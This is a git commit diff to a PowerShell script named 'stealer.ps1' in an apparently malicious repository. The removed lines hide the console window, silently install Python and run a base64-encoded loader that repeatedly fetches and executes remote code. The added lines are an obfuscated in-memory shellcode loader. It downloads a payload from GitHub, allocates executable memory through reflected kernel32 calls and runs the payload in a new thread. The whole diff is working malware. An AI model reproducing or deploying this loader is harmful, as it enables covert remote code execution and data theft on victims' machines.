d439ff244b6952bb24d89e85de681edaea6bd432
43a1723 <hai1723notgay@gmail.com>
2024-12-04 14:00:55 +0700

    Update stealer.ps1

--- shellcode/stealer.ps1
+++ shellcode/stealer.ps1
@@ -1,40 +1,23 @@
-# Install Python if it is not already installed
-Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class ConsoleWindowUtils {
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GetConsoleWindow();
-        
-        [DllImport("user32.dll")]
-        public static extern IntPtr GetParent(IntPtr hWnd);
-
-        [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        
-        public static IntPtr GetTargetWindow() {
-            IntPtr consoleWindow = GetConsoleWindow();
-            IntPtr parentWindow = GetParent(consoleWindow);
-            
-            if (parentWindow == IntPtr.Zero) {
-                return consoleWindow;
-            }
-            return parentWindow;
-        }
-    }
-"@
-
-[ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null
-
-$pythonPath = Get-Command python -ErrorAction SilentlyContinue
-
-if (-not $pythonPath) {
-    Write-Host "Python is not installed. Installing Python..."
-    $installerPath = "$env:TEMP\python-installer.exe"
-    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe" -OutFile $installerPath
-    Start-Process -FilePath $installerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
-    Remove-Item $installerPath
-    Start-Process powershell -ArgumentList "iwr https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/stealer.ps1 | iex"
-} else {
-    Start-Process python -ArgumentList '-c', 'exec(__import__("base64").b64decode(b"aW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCB0aW1lCgp1cmwgPSAiaHR0cHM6Ly9jb2RlYmVyZy5vcmcvNDNhMTcyMy9oYWkxNzIzL3Jhdy9icmFuY2gvbWFpbi9hL21haW4ucHkiCgp3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICAgIGNvbnRlbnQgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybCkucmVhZCgpCiAgICAgICAgZXhlYyhjb250ZW50KQogICAgICAgIGJyZWFrCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgdGltZS5zbGVlcCgzKQ=="))'
+$ProgressPreference = ('Sil'+'ent'+'l'+'yContinu'+'e')
+function blazeLoader {
+    Param ($blaze_modules, $blaze_func)
+    $assem = ([AppDomain]::"cU`R`Re`NTdOMaIn".(('GE'+'T')+('as'+'S')+('EmBLIe'+'S')).Invoke() | ? { $_."GlO`BaLasS`eMBLY`C`AchE" -and $_."lo`Ca`TIoN".('sp'+('L'+'It')).Invoke((('qw'+'IqwI').rEplAcE(([chAr]113+[chAr]119+[chAr]73),[sTriNG][chAr]92)))[-1].('Eq'+('u'+'al')+'S').Invoke(('Syst'+'e'+'m.dll')) }).(('g'+'ET')+'Ty'+'Pe').Invoke(('M'+'icrosoft.Win3'+'2.Uns'+'afeNa'+'tive'+'Metho'+'ds'))
+    $tmp = $assem.('gE'+'t'+('METh'+'ODS')).Invoke() | Where-Object { $_."NA`Me" -eq ('Get'+'P'+'rocAddre'+'ss') }
+    $handleMethod = $assem.(('getm'+'e')+('tho'+'d')).Invoke(('Ge'+'tModuleHa'+'nd'+'le'))
+    $handle = $handleMethod."In`V`OKE"($null, @($blaze_modules));[IntPtr] $result = 0
+    if ($handle -ne $null) { $result = $tmp[0]."i`Nv`oKe"($null, @($handle, $blaze_func))}
+    if ($result -eq [IntPtr]::"ZE`RO") {$handleRef = [System.Runtime.InteropServices.HandleRef]::('N'+'Ew').Invoke($null, $handle);$result = $tmp[0]."In`V`okE"($null, @($handleRef, $blaze_func))}
+    return $result
 }
+function blaze_delegates {
+    Param ([Parameter(poSItiOn = 0, manDaTOry = $True)] [Type[]] $func, [Parameter(pOSITion = 1)] [Type] $delType = [Void])
+    $type = [AppDomain]::"CurR`eNTDoM`AiN".(('d'+'EfIn')+('Ed'+'yna')+'m'+('iCAssE'+'MBL'+'Y')).Invoke((New-Object System.Reflection.AssemblyName(('R'+'eflect'+'edDelegat'+'e'))), [System.Reflection.Emit.AssemblyBuilderAccess]::"r`UN").('DE'+('finedy'+'nA')+('Micm'+'O')+'dU'+'lE').Invoke(('I'+'nMem'+'oryM'+'od'+'ule'), $false).(('dEF'+'in')+'e'+('Ty'+'pE')).Invoke(('MyD'+'elegateTy'+'p'+'e'), ('Cl'+'as'+'s, P'+'ublic, Se'+'al'+'ed'+', '+'Ansi'+'C'+'lass, AutoClass'), [System.MulticastDelegate])
+    $type."d`e`FIneCon`stRu`cTor"(('R'+'TSp'+'ec'+'i'+'al'+'Name, Hid'+'eByS'+'ig, Publi'+'c'), [System.Reflection.CallingConventions]::"StANd`ArD", $func).(('setIMP'+'L')+('em'+'en')+('T'+'ati')+'On'+'F'+('L'+'ag')+'s').Invoke(('Ru'+'ntime, Manag'+'e'+'d'))
+    $type.(('d'+'eFin')+'e'+('Met'+'hOD')).Invoke('Invoke', ('P'+'ubl'+'ic,'+' HideB'+'ySig, '+'N'+'ew'+'Slot, Virtu'+'al'), $delType, $func).(('s'+'Et')+'i'+('MP'+'L')+'eM'+('e'+'Ntati'+'Onf')+'La'+'gs').Invoke(('R'+'untime,'+' Mana'+'ged'))
+    return $type.(('Cr'+'E')+('at'+'eT')+'y'+'pE').Invoke()
+}
+$blazethegreat = (iwr -UseBasicParsing "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/hacker").Content
+$lpMem = [System.Runtime.InteropServices.Marshal]::('G'+('Etde'+'Le'+'ga')+('TEFo'+'r')+('fu'+'N')+'c'+('ti'+'Onp')+('OIN'+'T'+'ER')).Invoke((blazeLoader kernel32.dll VirtualAlloc), (blaze_delegates @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr])))."IN`VOke"([IntPtr]::"zE`RO", $blazethegreat."l`EnGTh", 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::('Co'+'pY').Invoke($blazethegreat, 0, $lpMem, $blazethegreat."Le`N`GtH")
+$hThread = [System.Runtime.InteropServices.Marshal]::('ge'+('Tde'+'L')+('E'+'gatE')+'Fo'+'R'+('func'+'TI'+'oNp')+'oi'+'NT'+'eR').Invoke((blazeLoader kernel32.dll CreateThread), (blaze_delegates @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr])))."Invo`Ke"([IntPtr]::"ZE`Ro", 0, $lpMem, [IntPtr]::"ze`Ro", 0, [IntPtr]::"zE`Ro")
+[System.Runtime.InteropServices.Marshal]::(('get'+'DELE'+'G')+('at'+'e')+'F'+'oR'+('f'+'unC')+'TI'+('ONP'+'oIn')+('t'+'er')).Invoke((blazeLoader kernel32.dll WaitForSingleObject), (blaze_delegates @([IntPtr], [Int32])([Int])))."I`NvOKe"($hThread, 0xFFFFFFFF)
